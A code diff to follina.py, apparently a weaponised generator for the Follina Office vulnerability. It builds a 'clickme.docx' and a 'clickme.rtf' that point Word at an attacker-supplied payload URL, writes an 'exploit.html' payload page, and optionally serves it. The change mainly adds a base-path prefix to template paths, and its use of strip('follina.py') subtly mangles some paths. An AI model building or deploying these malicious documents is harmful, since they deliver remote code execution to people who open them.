@@ -8,6 +8,10 @@ from time import sleep, perf_counter
 import threading as th
 from urllib.parse import urlparse
 
+# script base path
+basepath = os.path.abspath(__file__).strip("follina.py")
+
+
 # Helper function to zip whole dir
 # https://stackoverflow.com/questions/1855095/how-to-create-a-zip-archive-of-a-directory
 def zipdir(path, ziph):
@@ -24,21 +28,21 @@ def zipdir(path, ziph):
 def generate_docx(payload_url):
     const_docx_name = "clickme.docx"
 
-    with open("src/document.xml.rels.tpl", "r") as f:
+    with open(basepath + "src/document.xml.rels.tpl", "r") as f:
         tmp = f.read()
 
     payload_rels = tmp.format(payload_url = payload_url)
 
-    if not os.path.exists("src/docx/word/_rels"):
-        os.makedirs("src/docx/word/_rels")
+    if not os.path.exists(basepath + "src/docx/word/_rels"):
+        os.makedirs(basepath + "src/docx/word/_rels")
 
-    with open("src/docx/word/_rels/document.xml.rels", "w") as f:
+    with open(basepath + "src/docx/word/_rels/document.xml.rels", "w") as f:
         f.write(payload_rels)
 
     with zipfile.ZipFile(const_docx_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
-        zipdir("src/docx", zipf)
+        zipdir(basepath + "src/docx", zipf)
 
-    print(f"Generated '{const_docx_name}' in current directory")
+    print(f"Generated '{const_docx_name}' in " + basepath)
 
     return const_docx_name
 
@@ -58,7 +62,7 @@ def generate_rtf(payload_url):
     null_padding_ole_object = "00"*(196-int(len(docuri_hex_wide)/2))
     null_padding_link_object = "00"*(565-int(len(docuri_hex_wide)/2)-int(len(docuri_hex)/2))
 
-    with open("src/rtf/clickme.rtf.tpl", "r") as f:
+    with open(basepath + "src/rtf/clickme.rtf.tpl", "r") as f:
         tmp = f.read()
 
     payload_rtf = tmp.replace('payload_url_deobf', payload_url) # cannot use format due to {} characters in RTF
@@ -77,7 +81,6 @@ def generate_rtf(payload_url):
     return const_rtf_name
 
 if __name__ == "__main__":
-    
     # Parse arguments
     parser = argparse.ArgumentParser()
     required = parser.add_argument_group('Required Arguments')
@@ -145,7 +148,7 @@ if __name__ == "__main__":
     if not os.path.exists("www"):
         os.makedirs("www")
 
-    with open("src/exploit.html.tpl", "r") as f:
+    with open(basepath + "src/exploit.html.tpl", "r") as f:
         tmp = f.read()
 
     payload_html = tmp.format(payload = payload)
@@ -153,7 +156,7 @@ if __name__ == "__main__":
     with open("www/exploit.html", "w") as f:
         f.write(payload_html)
 
-    print("Generated 'exploit.html' in 'www' directory")
+    print("Generated 'exploit.html' in " + basepath + "'www' directory")
     
     # Host the payload
     if enable_webserver is True:
